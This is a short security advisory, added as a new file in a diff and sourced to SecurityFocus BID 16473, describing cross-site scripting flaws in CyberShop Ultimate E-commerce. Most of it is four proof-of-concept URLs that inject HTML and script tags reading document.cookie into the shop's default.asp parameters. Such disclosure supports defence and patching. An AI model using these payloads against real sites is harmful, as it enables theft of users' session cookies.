@@ -1,0 +1,16 @@
+source: http://www.securityfocus.com/bid/16473/info
+
+CyberShop Ultimate E-commerce is prone to multiple cross-site scripting vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.
+
+An attacker may leverage these issue to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. These may facilitate the theft of cookie-based authentication credentials as well as other attacks. 
+
+http://www.example.com/default.asp?gb=urun&id=18&ortak="<h1>Patriotic%20Hackers<h1>
+
+
+http://www.example.com/default.asp?gb=kate&kat=<script>alert(document.cookie</script>&ortak=
+
+
+http://www.example.com/default.asp?gb=kate&kat=<script>alert(document.title)</script>&ortak=
+
+
+http://www.example.com/default.asp?gb=kate&kat=AnaKart&ortak="><script>alert(document.cookie)</script> 
